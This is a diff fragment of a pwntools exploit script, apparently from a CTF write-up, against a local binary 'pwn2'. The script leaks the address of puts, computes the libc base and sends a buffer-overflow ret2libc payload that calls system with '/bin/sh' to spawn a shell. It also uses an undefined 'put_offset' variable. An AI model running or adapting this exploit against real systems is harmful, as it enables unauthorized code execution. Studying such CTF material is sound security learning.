@@ -123,19 +123,24 @@ exp:
 
 ```
 from pwn import *
-import sys
+
 r = process("./pwn2")
 elf = ELF("./pwn2")
 print util.proc.pidof(r)
+
 puts_plt = elf.plt['puts']
 puts_got = elf.got['puts']
 puts_offset = 0x5f140
-printf_got = elf.got['printf']
+
+#printf_got = elf.got['printf']
+
 function = 0x8048637
 system_offset = 0x3a940
+binsh_offset = 0x15902b
+
 name = 'a'*250
 occ = 'b'*250
-pause()
+
 
 r.recv()
 r.sendline(name)
@@ -152,7 +157,7 @@ put_addr = u32(r.recv(4))
 success(hex(put_addr))
 libc_addr = put_addr - put_offset
 sys_addr = libc_addr + system_offset
-binsh_addr = libc_addr + 0x15902b
+binsh_addr = libc_addr + binsh_offset
 payload = 'a'*(0x111+4) + p32(sys_addr) + p32(function) + p32(binsh_addr)
 r.recv()
 r.sendline(name)
